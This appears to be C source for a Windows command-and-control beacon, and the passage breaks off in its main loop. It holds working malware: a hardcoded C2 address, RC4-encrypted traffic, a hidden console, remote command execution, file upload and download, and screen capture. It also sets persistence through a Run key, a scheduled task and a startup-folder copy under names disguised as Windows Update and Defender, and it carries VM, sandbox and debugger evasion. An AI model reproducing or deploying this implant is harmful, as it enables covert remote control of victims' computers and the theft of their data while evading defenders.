#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <winternl.h>
#include <shlobj.h>
#include <psapi.h>  // Add this for process functions

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib") 

char* get_system_info();
char* get_process_list();
char* get_network_info();

// Configuration
#define C2_SERVER "192.168.1.211"  // Localhost for testing
#define C2_PORT 8080
#define PASSWORD "Mr.Robot"
#define BEACON_INTERVAL 30000
#define JITTER_RANGE 10000
#define ENABLE_VM_CHECKS 0


// ==================== RC4 IMPLEMENTATION ====================
typedef struct {
    unsigned char S[256];
    int i, j;
} RC4_CTX;

void rc4_init(RC4_CTX *ctx, const unsigned char *key, int key_len) {
    int i, j = 0;
    
    for (i = 0; i < 256; i++) {
        ctx->S[i] = i;
    }
    
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) % 256;
        unsigned char temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }
    
    ctx->i = ctx->j = 0;
}

void rc4_crypt(RC4_CTX *ctx, unsigned char *data, int data_len) {
    int i = ctx->i;
    int j = ctx->j;
    unsigned char *S = ctx->S;
    
    for (int k = 0; k < data_len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        
        unsigned char temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        
        unsigned char K = S[(S[i] + S[j]) % 256];
        data[k] ^= K;
    }
    
    ctx->i = i;
    ctx->j = j;
}

// ==================== BASE64 ====================
const char base64_chars[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

int base64_encode(const unsigned char *input, int input_len, char *output) {
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    while (input_len--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (i = 0; i < 4; i++) {
                output[j++] = base64_chars[char_array_4[i]];
            }
            i = 0;
        }
    }
    
    if (i) {
        for (int k = i; k < 3; k++) {
            char_array_3[k] = '\0';
        }
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        
        for (int k = 0; k < i + 1; k++) {
            output[j++] = base64_chars[char_array_4[k]];
        }
        
        while (i++ < 3) {
            output[j++] = '=';
        }
    }
    
    output[j] = '\0';
    return j;
}

// ==================== ENCRYPTION WRAPPER ====================
char* rc4_encrypt(const char* plaintext) {
    int len = strlen(plaintext);
    
    // Calculate maximum base64 size: 4 * ceil(n/3)
    int max_b64_size = ((len + 2) / 3) * 4 + 1;
    
    // Allocate buffers on heap
    unsigned char* data = (unsigned char*)malloc(len);
    char* base64_output = (char*)malloc(max_b64_size);
    char* encrypted = (char*)malloc(max_b64_size);
    
    if (!data || !base64_output || !encrypted) {
        printf("[-] Memory allocation failed in rc4_encrypt\n");
        if (data) free(data);
        if (base64_output) free(base64_output);
        if (encrypted) free(encrypted);
        return NULL;
    }
    
    // Initialize RC4
    RC4_CTX ctx;
    rc4_init(&ctx, (unsigned char*)PASSWORD, strlen(PASSWORD));
    
    // Create mutable copy (no null terminator needed for encryption)
    memcpy(data, plaintext, len);
    
    // Encrypt
    rc4_crypt(&ctx, data, len);
    
    // Base64 encode
    int b64_len = base64_encode(data, len, base64_output);
    strcpy(encrypted, base64_output);
    
    // Free temporary buffers
    free(data);
    free(base64_output);
    
    return encrypted;
}

char* rc4_decrypt(const char* encrypted_b64) {
    static unsigned char decrypted[4096];
    
    // Base64 decode
    int decoded_len = 0;
    int i = 0, j = 0, k = 0;
    unsigned char char_array_4[4], char_array_3[3];
    int input_len = strlen(encrypted_b64);
    
    while (input_len-- && encrypted_b64[k] != '=') {
        char_array_4[i++] = encrypted_b64[k]; k++;
        
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                for (j = 0; j < 64; j++) {
                    if (char_array_4[i] == base64_chars[j]) {
                        char_array_4[i] = j;
                        break;
                    }
                }
            }
            
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];
            
            for (i = 0; i < 3; i++) {
                decrypted[decoded_len++] = char_array_3[i];
            }
            i = 0;
        }
    }
    
    if (i) {
        for (k = i; k < 4; k++) {
            char_array_4[k] = 0;
        }
        
        for (k = 0; k < 4; k++) {
            for (int m = 0; m < 64; m++) {
                if (char_array_4[k] == base64_chars[m]) {
                    char_array_4[k] = m;
                    break;
                }
            }
        }
        
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];
        
        for (k = 0; k < i - 1; k++) {
            decrypted[decoded_len++] = char_array_3[k];
        }
    }
    
    decrypted[decoded_len] = '\0';
    
    // Initialize RC4 for decryption
    RC4_CTX ctx;
    rc4_init(&ctx, (unsigned char*)PASSWORD, strlen(PASSWORD));
    
    // Decrypt (RC4 encryption = decryption)
    rc4_crypt(&ctx, decrypted, decoded_len);
    
    return (char*)decrypted;
}

// ==================== SYSTEM PROFILING FUNCTIONS ====================

char* get_system_info() {
    static char info[8192] = {0};  // Larger buffer for all info
    char buffer[1024];
    
    // Initialize the info string
    strcpy(info, "=== SYSTEM PROFILE ===\n\n");
    
    // 1. BASIC SYSTEM INFO
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    GetComputerNameA(computer_name, &size);
    
    char username[256];
    DWORD username_len = sizeof(username);
    GetUserNameA(username, &username_len);
    
    // Get Windows version
    OSVERSIONINFOEXA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    GetVersionExA((OSVERSIONINFOA*)&osvi);
    
    // Get system time
    SYSTEMTIME sys_time;
    GetLocalTime(&sys_time);
    
    // Get Windows directory
    char windows_dir[MAX_PATH];
    GetWindowsDirectoryA(windows_dir, MAX_PATH);
    
    // Get system directory
    char system_dir[MAX_PATH];
    GetSystemDirectoryA(system_dir, MAX_PATH);
    
    // Get current directory
    char current_dir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, current_dir);
    
    // Build basic info
    snprintf(buffer, sizeof(buffer),
        "=== BASIC INFO ===\n"
        "Computer Name: %s\n"
        "Username: %s\n"
        "Windows Version: %d.%d Build %d (SP %d.%d)\n"
        "Platform ID: %d\n"
        "Windows Dir: %s\n"
        "System Dir: %s\n"
        "Current Dir: %s\n"
        "Local Time: %02d/%02d/%04d %02d:%02d:%02d\n"
        "Process ID: %d\n\n",
        computer_name,
        username,
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        osvi.wServicePackMajor, osvi.wServicePackMinor,
        osvi.dwPlatformId,
        windows_dir,
        system_dir,
        current_dir,
        sys_time.wMonth, sys_time.wDay, sys_time.wYear,
        sys_time.wHour, sys_time.wMinute, sys_time.wSecond,
        GetCurrentProcessId());
    
    strcat(info, buffer);
    
    // 2. MEMORY INFO
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status);
    
    snprintf(buffer, sizeof(buffer),
        "=== MEMORY INFO ===\n"
        "Total Physical: %llu MB\n"
        "Available Physical: %llu MB\n"
        "Total Page File: %llu MB\n"
        "Available Page File: %llu MB\n"
        "Total Virtual: %llu MB\n"
        "Available Virtual: %llu MB\n"
        "Memory Load: %ld%%\n\n",
        mem_status.ullTotalPhys / (1024 * 1024),
        mem_status.ullAvailPhys / (1024 * 1024),
        mem_status.ullTotalPageFile / (1024 * 1024),
        mem_status.ullAvailPageFile / (1024 * 1024),
        mem_status.ullTotalVirtual / (1024 * 1024),
        mem_status.ullAvailVirtual / (1024 * 1024),
        mem_status.dwMemoryLoad);
    
    strcat(info, buffer);
    
    // 3. DISK INFO (Get logical drives)
    DWORD drives = GetLogicalDrives();
    strcat(info, "=== DISK DRIVES ===\n");
    
    char drive_letter[] = "A:\\";
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            drive_letter[0] = 'A' + i;
            UINT type = GetDriveTypeA(drive_letter);
            
            const char* type_str;
            switch (type) {
                case DRIVE_FIXED: type_str = "Fixed Disk"; break;
                case DRIVE_REMOVABLE: type_str = "Removable"; break;
                case DRIVE_CDROM: type_str = "CD-ROM"; break;
                case DRIVE_REMOTE: type_str = "Network"; break;
                case DRIVE_RAMDISK: type_str = "RAM Disk"; break;
                default: type_str = "Unknown"; break;
            }
            
            // Get disk free space
            ULARGE_INTEGER free_bytes, total_bytes, total_free_bytes;
            if (GetDiskFreeSpaceExA(drive_letter, &free_bytes, &total_bytes, &total_free_bytes)) {
                snprintf(buffer, sizeof(buffer),
                    "Drive %s: %s (Total: %llu MB, Free: %llu MB)\n",
                    drive_letter, type_str,
                    total_bytes.QuadPart / (1024 * 1024),
                    free_bytes.QuadPart / (1024 * 1024));
            } else {
                snprintf(buffer, sizeof(buffer),
                    "Drive %s: %s (Access Denied)\n",
                    drive_letter, type_str);
            }
            
            strcat(info, buffer);
        }
    }
    strcat(info, "\n");
    
    return info;
}

// Function to list running processes (limited)
char* get_process_list() {
    static char proc_info[8192] = {0};  // 8KB buffer
    char buffer[256];
    
    strcpy(proc_info, "=== RUNNING PROCESSES (First 50) ===\n");
    
    // Create toolhelp snapshot
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        strcat(proc_info, "Failed to create process snapshot\n");
        return proc_info;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        strcat(proc_info, "Failed to enumerate processes\n");
        return proc_info;
    }
    
    int count = 0;
    int max_processes = 50;  // Limit to 50 processes
    
    do {
        // Skip system processes if we want to save space
        // if (pe32.th32ProcessID < 100) continue;
        
        snprintf(buffer, sizeof(buffer),
            "PID: %6d | %s\n",  // Simplified output
            pe32.th32ProcessID,
            pe32.szExeFile);
        
        if (strlen(proc_info) + strlen(buffer) < sizeof(proc_info) - 100) {
            strcat(proc_info, buffer);
            count++;
        }
        
        if (count >= max_processes) {
            strcat(proc_info, "... (limited to first 50 processes)\n");
            break;
        }
    } while (Process32Next(snapshot, &pe32));
    
    CloseHandle(snapshot);
    
    snprintf(buffer, sizeof(buffer), "\nTotal processes shown: %d\n", count);
    strcat(proc_info, buffer);
    
    return proc_info;
}

// Function to get basic network info
char* get_network_info() {
    static char net_info[2048] = {0};
    
    strcpy(net_info, "=== NETWORK INFO ===\n");
    
    // Get hostname
    char hostname[256];
    DWORD hostname_len = sizeof(hostname);
    if (GetComputerNameA(hostname, &hostname_len)) {
        char buffer[512];
        snprintf(buffer, sizeof(buffer), "Hostname: %s\n", hostname);
        strcat(net_info, buffer);
    }
    
    // Get IP addresses via ipconfig (simplified)
    FILE* fp = _popen("ipconfig | findstr /i \"IPv4 Address\"", "r");
    if (fp) {
        char buffer[256];
        while (fgets(buffer, sizeof(buffer), fp)) {
            buffer[strcspn(buffer, "\r\n")] = 0;
            strcat(net_info, buffer);
            strcat(net_info, "\n");
        }
        _pclose(fp);
    }
    
    strcat(net_info, "\n");
    return net_info;
}

// ==================== HIDE CONSOLE WINDOW ====================
// This hides the console window while keeping the process running
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

// Alternative method using WinAPI
void hide_console_window() {
    HWND hWnd = GetConsoleWindow();
    if (hWnd) {
        ShowWindow(hWnd, SW_HIDE);  // Hide window
        // Optional: Also minimize to tray
        // ShowWindow(hWnd, SW_MINIMIZE);
    }
}

// ==================== COMMAND EXECUTION ====================
char* execute_system_command(const char* command) {
    static char output[8192] = {0};
    FILE* fp;
    
    printf("[DEBUG] Executing: %s\n", command);
    
    // Use _popen for Windows
    fp = _popen(command, "r");
    if (fp == NULL) {
        strcpy(output, "Command execution failed");
        return output;
    }
    
    // Read output
    size_t total_read = 0;
    while (!feof(fp) && total_read < sizeof(output) - 1) {
        size_t bytes_read = fread(output + total_read, 1, sizeof(output) - total_read - 1, fp);
        total_read += bytes_read;
    }
    output[total_read] = '\0';
    
    // Replace newlines and quotes for JSON compatibility
    for (int i = 0; i < total_read; i++) {
        if (output[i] == '\n') output[i] = ' ';
        if (output[i] == '\"') output[i] = '\'';
        if (output[i] == '\\') output[i] = '/';
    }
    
    _pclose(fp);
    return output;
}

// ==================== FILE OPERATIONS ====================

int write_file(const char* filename, const char* base64_data, int b64_len) {
    FILE* fp = fopen(filename, "wb");
    if (!fp) {
        printf("[-] Failed to create file: %s\n", filename);
        return -1;
    }
    
    // Base64 decode and write
    int decoded_len = 0;
    int i = 0, j = 0, k = 0;
    unsigned char char_array_4[4], char_array_3[3];
    
    while (k < b64_len && base64_data[k] != '=') {
        char_array_4[i++] = base64_data[k++];
        
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                for (j = 0; j < 64; j++) {
                    if (char_array_4[i] == base64_chars[j]) {
                        char_array_4[i] = j;
                        break;
                    }
                }
            }
            
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];
            
            for (i = 0; i < 3; i++) {
                fputc(char_array_3[i], fp);
                decoded_len++;
            }
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j < 4; j++) {
            char_array_4[j] = 0;
        }
        
        for (j = 0; j < 4; j++) {
            for (int m = 0; m < 64; m++) {
                if (char_array_4[j] == base64_chars[m]) {
                    char_array_4[j] = m;
                    break;
                }
            }
        }
        
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x03) << 6) + char_array_4[3];
        
        for (j = 0; j < i - 1; j++) {
            fputc(char_array_3[j], fp);
            decoded_len++;
        }
    }
    
    fclose(fp);
    printf("[+] File written: %s (%d bytes)\n", filename, decoded_len);
    return decoded_len;
}

char* read_file_base64(const char* filename, int* out_size) {
    FILE* fp = fopen(filename, "rb");
    if (!fp) {
        printf("[-] Failed to open file: %s\n", filename);
        *out_size = 0;
        return NULL;
    }
    
    // Get file size
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    // Read file
    unsigned char* file_data = (unsigned char*)malloc(file_size);
    if (!file_data) {
        fclose(fp);
        printf("[-] Memory allocation failed\n");
        *out_size = 0;
        return NULL;
    }
    
    fread(file_data, 1, file_size, fp);
    fclose(fp);
    
    // Base64 encode (calculate size: 4 * ceil(n/3))
    int b64_size = ((file_size + 2) / 3) * 4 + 1;
    char* b64_data = (char*)malloc(b64_size);
    if (!b64_data) {
        free(file_data);
        printf("[-] Base64 buffer allocation failed\n");
        *out_size = 0;
        return NULL;
    }
    
    base64_encode(file_data, file_size, b64_data);
    free(file_data);
    
    *out_size = b64_size - 1;  // Exclude null terminator
    printf("[+] File read: %s (%ld bytes -> %d base64 chars)\n", filename, file_size, *out_size);
    return b64_data;
}

// Helper to extract JSON values
char* extract_json_value(const char* json, const char* key) {
    char* key_pos = strstr(json, key);
    if (!key_pos) return NULL;
    
    char* colon_pos = strchr(key_pos, ':');
    if (!colon_pos) return NULL;
    
    colon_pos++; // Skip ':'
    
    // Skip whitespace
    while (*colon_pos == ' ' || *colon_pos == '\t' || *colon_pos == '\n' || *colon_pos == '\r') {
        colon_pos++;
    }
    
    // Check if value is quoted
    int is_quoted = (*colon_pos == '"');
    if (is_quoted) colon_pos++;
    
    // Find end of value
    char* end_pos;
    if (is_quoted) {
        end_pos = strchr(colon_pos, '"');
    } else {
        end_pos = colon_pos;
        while (*end_pos && *end_pos != ',' && *end_pos != '}' && *end_pos != ' ' && *end_pos != '\t' && *end_pos != '\n' && *end_pos != '\r') {
            end_pos++;
        }
    }
    
    if (!end_pos) return NULL;
    
    // Allocate and copy value
    int len = end_pos - colon_pos;
    char* value = (char*)malloc(len + 1);
    if (!value) return NULL;
    
    strncpy(value, colon_pos, len);
    value[len] = '\0';
    
    return value;
}

// ==================== STRING OBFUSCATION ====================

// XOR-based string obfuscation
char* deobfuscate(const char* encrypted, char key) {
    int len = strlen(encrypted);
    char* result = (char*)malloc(len + 1);
    
    for (int i = 0; i < len; i++) {
        result[i] = encrypted[i] ^ key;
    }
    result[len] = '\0';
    
    return result;
}

// Obfuscated strings (XOR with 0xAA)
#define OBF_STR(str) deobfuscate(str, 0xAA)

// Pre-obfuscated strings (you can generate these with a Python script)
static const char obf_ws2_32[] = {0xe6, 0xe4, 0xf8, 0xce, 0xf8, 0xc0, 0x00};
static const char obf_kernel32[] = {0xe1, 0xed, 0xe4, 0xef, 0xe0, 0xe4, 0xf8, 0xce, 0xf8, 0xc0, 0x00};
static const char obf_user32[] = {0xe6, 0xf2, 0xee, 0xe4, 0xf8, 0xce, 0xf8, 0xc0, 0x00};

// Function to get obfuscated module handles
HMODULE get_obf_module(const char* obf_name, char key) {
    char* real_name = deobfuscate(obf_name, key);
    HMODULE hModule = GetModuleHandleA(real_name);
    free(real_name);
    return hModule;
}

// ==================== VM/SANDBOX DETECTION ====================

int check_virtual_machine() {
    int is_vm = 0;
    
    // Technique 1: Check common VM process names
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                char* proc_name = pe32.szExeFile;
                // Check for VM processes (case-insensitive)
                if (_stricmp(proc_name, "vboxservice.exe") == 0 ||
                    _stricmp(proc_name, "vboxtray.exe") == 0 ||
                    _stricmp(proc_name, "vmwaretray.exe") == 0 ||
                    _stricmp(proc_name, "vmwareuser.exe") == 0 ||
                    _stricmp(proc_name, "vmusrvc.exe") == 0 ||
                    _stricmp(proc_name, "vmsrvc.exe") == 0 ||
                    _stricmp(proc_name, "xenservice.exe") == 0) {
                    printf("[!] VM process detected: %s\n", proc_name);
                    is_vm = 1;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    // Technique 2: Check for common VM MAC address prefixes
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo) {
        if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
            free(pAdapterInfo);
            pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
        }
        
        if (pAdapterInfo && GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                // Check for VM MAC prefixes
                if (pAdapter->AddressLength >= 6) {
                    // VMware: 00:50:56, 00:0C:29, 00:05:69
                    // VirtualBox: 08:00:27
                    // Xen: 00:16:3E
                    if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
                        (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
                        (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x05 && pAdapter->Address[2] == 0x69) ||
                        (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27) ||
                        (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x16 && pAdapter->Address[2] == 0x3E)) {
                        printf("[!] VM MAC address detected\n");
                        is_vm = 1;
                        break;
                    }
                }
                pAdapter = pAdapter->Next;
            }
        }
        if (pAdapterInfo) free(pAdapterInfo);
    }
    
    // Technique 3: Check for common VM registry keys
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\ACPI\\DSDT\\VBOX__", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        printf("[!] VirtualBox registry key detected\n");
        RegCloseKey(hKey);
        is_vm = 1;
    }
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\vpc-s3", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        printf("[!] VirtualPC registry key detected\n");
        RegCloseKey(hKey);
        is_vm = 1;
    }
    
    return is_vm;
}

// Debugger detection
int check_debugger() {
    int is_debugged = 0;
    
    // Technique 1: Check BeingDebugged flag in PEB
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    if (debugged || IsDebuggerPresent()) {
        printf("[!] Debugger detected (IsDebuggerPresent)\n");
        is_debugged = 1;
    }
    
    // Technique 2: Check NtGlobalFlag (common debugger flag)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        typedef NTSTATUS (WINAPI *PNtQueryInformationProcess)(HANDLE, UINT, PVOID, ULONG, PULONG);
        PNtQueryInformationProcess NtQueryInformationProcess = 
            (PNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
        
        if (NtQueryInformationProcess) {
            DWORD flags = 0;
            NTSTATUS status = NtQueryInformationProcess(
                GetCurrentProcess(), 
                0x1F, // ProcessDebugFlags
                &flags, 
                sizeof(flags), 
                NULL
            );
            
            if (NT_SUCCESS(status) && flags == 0) {
                printf("[!] Debugger detected (ProcessDebugFlags)\n");
                is_debugged = 1;
            }
        }
    }
    
    return is_debugged;
}


// ==================== SCREEN CAPTURE ====================

char* capture_screen(int* out_size) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    // Get screen dimensions
    int screenWidth = 800;
    int screenHeight = 600;
    
    // Create bitmap
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);
    
    // Copy screen to bitmap
    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    // Save bitmap to memory
    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = screenWidth;
    bi.biHeight = screenHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 24;  // 24-bit color
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;
    
    // Calculate bitmap size
    DWORD dwBmpSize = ((screenWidth * bi.biBitCount + 31) / 32) * 4 * screenHeight;
    
    // Allocate memory for bitmap data
    char* lpbitmap = (char*)malloc(dwBmpSize);
    
    // Get bitmap bits
    GetDIBits(hdcScreen, hBitmap, 0, screenHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    // Cleanup
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    // Create BMP file in memory
    BITMAPFILEHEADER bmfHeader;
    DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    
    bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
    bmfHeader.bfSize = dwSizeofDIB;
    bmfHeader.bfType = 0x4D42; // "BM"
    
    // Combine headers and bitmap data
    char* bmp_data = (char*)malloc(dwSizeofDIB);
    memcpy(bmp_data, &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(bmp_data + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
    memcpy(bmp_data + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpbitmap, dwBmpSize);
    
    free(lpbitmap);
    
    *out_size = dwSizeofDIB;
    printf("[+] Screen captured: %dx%d (%d bytes)\n", screenWidth, screenHeight, dwSizeofDIB);
    return bmp_data;
}

// Function to save screenshot to file and return base64
char* get_screenshot_base64(int* out_size) {
    int bmp_size = 0;
    char* bmp_data = capture_screen(&bmp_size);
    
    if (!bmp_data || bmp_size == 0) {
        *out_size = 0;
        return NULL;
    }
    
    // Base64 encode
    int b64_size = ((bmp_size + 2) / 3) * 4 + 1;
    char* b64_data = (char*)malloc(b64_size);
    
    base64_encode((unsigned char*)bmp_data, bmp_size, b64_data);
    
    free(bmp_data);
    
    *out_size = b64_size - 1;
    return b64_data;
}

char* bin_to_hex(const unsigned char* data, int len) {
    char* hex = (char*)malloc(len * 2 + 1);
    for (int i = 0; i < len; i++) {
        sprintf(hex + (i * 2), "%02x", data[i]);
    }
    hex[len * 2] = '\0';
    return hex;
}


// ==================== PERSISTENCE FUNCTIONS ====================

int add_registry_persistence(const char* beacon_path) {
    HKEY hKey;
    LONG result;
    
    // Current user run key (survives logon)
    result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_WRITE,
        &hKey
    );
    
    if (result != ERROR_SUCCESS) {
        printf("[-] Failed to open registry key: %ld\n", result);
        return 0;
    }
    
    // Add registry entry
    result = RegSetValueExA(
        hKey,
        "WindowsUpdateHelper",  // Disguised name
        0,
        REG_SZ,
        (const BYTE*)beacon_path,
        strlen(beacon_path) + 1
    );
    
    RegCloseKey(hKey);
    
    if (result == ERROR_SUCCESS) {
        printf("[+] Registry persistence added: %s\n", beacon_path);
        return 1;
    } else {
        printf("[-] Failed to set registry value: %ld\n", result);
        return 0;
    }
}

int add_scheduled_task_persistence(const char* beacon_path) {
    // Create a scheduled task that runs on logon
    char command[1024];
    
    // Create task command
    snprintf(command, sizeof(command),
             "schtasks /create /tn \"WindowsDefenderScan\" /tr \"%s\" /sc onlogon /rl highest /f",
             beacon_path);
    
    // Execute command
    system(command);
    
    printf("[+] Scheduled task created (if admin)\n");
    return 1;
}

int add_startup_folder_persistence(const char* beacon_path) {
    // Alternative: Startup folder (requires copying file)
    char startup_path[MAX_PATH];
    char dest_path[MAX_PATH];
    
    // Get startup folder path
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_path) != S_OK) {
        printf("[-] Failed to get startup folder path\n");
        return 0;
    }
    
    // Create destination path
    snprintf(dest_path, sizeof(dest_path), "%s\\WindowsUpdate.exe", startup_path);
    
    // Copy beacon to startup folder
    if (CopyFileA(beacon_path, dest_path, FALSE)) {
        printf("[+] Beacon copied to startup folder: %s\n", dest_path);
        return 1;
    } else {
        printf("[-] Failed to copy to startup folder: %ld\n", GetLastError());
        return 0;
    }
}

// ==================== BEACON MAIN ====================
int main() {

    hide_console_window();
    printf("[+] C2 Beacon Starting\n");
        if (ENABLE_VM_CHECKS) {
        if (check_virtual_machine()) {
            printf("[!] Running in VM/Sandbox - exiting\n");
            return 0;
        }
        
        if (check_debugger()) {
            printf("[!] Debugger detected - exiting\n");
            return 0;
        }
    } else {
        printf("[+] VM checks disabled for testing\n");
    }
    printf("[+] Server: %s:%d\n", C2_SERVER, C2_PORT);
    printf("[+] Password: %s\n", PASSWORD);
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] WSAStartup failed\n");
        return 1;
    }
    
    srand((unsigned int)time(NULL));
    
    int attempt = 0;
    
    while (1) {
        attempt++;
        printf("\n[+] Attempt #%d\n", attempt);
        
        // Create socket
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            printf("[-] Socket failed: %d\n", WSAGetLastError());
            Sleep(10000);
            continue;
        }
        
        // Setup server address
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(C2_PORT);
        server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);
        
        // Connect
        printf("[+] Connecting...\n");
        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            printf("[-] Connect failed: %d\n", WSAGetLastError());
            closesocket(sock);
            Sleep(10000);
            continue;
        }
        
        printf("[+] Connected!\n");
        
        // Send initial checkin
        char checkin[256];
        snprintf(checkin, sizeof(checkin),
